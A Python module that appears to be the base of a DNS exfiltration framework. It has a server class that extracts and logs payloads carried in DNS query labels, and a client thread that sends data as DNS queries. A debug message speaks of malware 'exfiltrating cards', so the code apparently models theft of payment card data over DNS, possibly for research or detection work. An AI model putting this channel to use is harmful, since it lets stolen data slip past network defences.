import logging
import os
import threading
from abc import abstractmethod
from collections import Iterable
from datetime import datetime
from typing import Tuple, Union, Optional

from dnslib import DNSRecord, DNSQuestion

from util import warning, ok


class Client:
    def __init__(self, domain: str):
        self.domain = domain


class Server:
    def __init__(self, domain: str, server_ip: str, log_dir: str = None):
        self.domain: str = domain
        self.server_ip: str = server_ip

        if log_dir is None:
            log_dir = "logs"
        log_file = os.path.join(log_dir, f"server__{domain}__{datetime.now():%Y-%m-%d-%H-%M-%S}.log")

        # Setup logging
        self.logger = logging.getLogger('server_logger_' + domain)
        self.logger.setLevel(logging.DEBUG)

        formatter = logging.Formatter(fmt='%(asctime)s.%(msecs)03d@@@%(message)s', datefmt='%Y-%m-%d %H:%M:%S')

        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        fh = logging.FileHandler(log_file, "a")
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)

    def get_payload(self, record: DNSQuestion) -> Union[str, bool]:
        label = str(record.get_qname()).rstrip('.')

        if self.check_domain(label[-len(self.domain):]):
            return label[:-len(self.domain)].rstrip('.')
        else:
            return False

    def check_domain(self, other_domain: str) -> bool:
        return self.domain == other_domain

    def log_result(self, category, result):

        # Write to stdout
        ok(f"[{category}] {result}")

        # Prepare for CSV
        if isinstance(result, Iterable) and not isinstance(result, str):
            log_result = "@@@".join([x.encode().hex() for x in result])
        else:
            log_result = result.encode().hex()

        self.logger.info(f"{category}@@@{log_result}")

    def process(self, payload: str):
        try:
            self.log_result("decoded", self.process_payload(payload))
        except:
            self.log_result("failed decoding", payload)

    @abstractmethod
    def process_payload(self, payload: str) -> Optional[str]:
        pass

    @abstractmethod
    def receive(self, question: DNSRecord) -> DNSRecord:
        pass


class ExfiltrationThread(threading.Thread):
    def __init__(self, client: Client, dns_settings: Tuple[str, int], log_dir: str = None):
        super().__init__()

        self.client = client
        self.dns_settings = dns_settings
        self.num_exfiltrated = 0

        if log_dir is None:
            log_dir = "logs"
        log_file = os.path.join(log_dir, f"client__{client.domain}__{datetime.now():%Y-%m-%d-%H-%M-%S}.log")

        # Setup logging
        self.logger = logging.getLogger('client_logger_' + client.domain)
        self.logger.setLevel(logging.DEBUG)

        formatter = logging.Formatter(fmt='%(asctime)s.%(msecs)03d@@@%(message)s', datefmt='%Y-%m-%d %H:%M:%S')

        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        fh = logging.FileHandler(log_file, "a")
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)

    def analytics(self, num: int):
        self.num_exfiltrated += num

    def print_debug(self, malware_name: str, num: int):
        return f"[{malware_name}] Exfiltrating {num} cards, total: {self.num_exfiltrated}."

    def dns_query(self, data: str, type: str = 'A') -> DNSRecord:
        query = DNSRecord.question(data, type)
        threading.Thread(target=lambda: query.send(*self.dns_settings)).start()

        warning(f"[Sent]     {query.q.qname}")
        self.logger.info(f"sent@@@{query.q.qname}")

        return query
